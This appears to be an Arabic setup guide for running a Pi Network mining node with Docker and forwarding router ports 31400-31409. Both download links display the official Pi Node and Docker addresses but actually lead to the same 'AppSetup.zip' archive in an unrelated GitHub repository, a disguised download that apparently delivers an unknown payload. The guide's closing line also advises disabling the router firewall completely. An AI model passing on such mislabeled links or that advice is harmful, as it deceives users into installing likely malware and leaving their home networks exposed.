للبدء بالتعدين يجب التأكد من تنصيب البرامج التالية:

1. برنامج التعدين من الموقع الرسمي
[https://node.minepi.com/node/](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)

2. برنامج دوكر لتشغيل الأنظمة الوهمية
[https://docs.docker.com/docker-for-windows/install](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)


بعد تنصيب البرامج نشغل docker ثم نشغل برنامج Pi Node و نتبع خطوات التشغيل الأولية و الاقتران مع البرنامج على الهاتف.
للتأكد من عمل البرنامج بشكل صحيح:

1. نضغط على Node من الجهة اليمنى للواجهة(نضغط على تخطي أو continue)

2. نضغط على visit tech setup

3. نتأكد أن دوكر و البوابات المطلوبة تعمل بشكل كامل.


لفتح البوابات المطلوبة بين 31400 و 31409 يجب علينا الدخول إلى صفحة إدارة جهاز الراوتر المسؤول عن توزيع الإنترنت في المنزل و توجيه البوابات بشكل يدوي.

1. نفتح نافذة موجه الأوامر cmd و نكتب ipconfig
سنرى قسم مشابه للتالي:

Drahtlos-LAN-Adapter WLAN:


   DNS-Suffix: Belkin
   Verbindungslokale IPv6-Adresse  . : ffff::ffff:1ac6:ffff:759d%9
   IPv4-Adresse  . . . . . . . . . . : 192.168.2.16
   Subnetzmaske  . . . . . . . . . . : 255.255.255.0
   Standardgateway . . . . . . . . . : 192.168.2.1



2. العنوان بجانب Standardgateway هو عنوان جهاز الراوتر. ننسخ العنوان(في حالتي العنوان هو 192.168.2.1) و نشغله في نافذة متصفح إنترنت.

من إعدادات الراوتر يجب أن نجد القسم المسؤول عن توجيه البوابات port forwarding. الرجاء اتباع التعليمات من الرابط التالي

https://www.wikihow.com/Set-Up-Port-Forwarding-on-a-Router


إذا استمرت مشكلة التواصل مع البوابات 31400-31409 جرب تعطيل الجدار الناري بالكامل من إعدادات الراوتر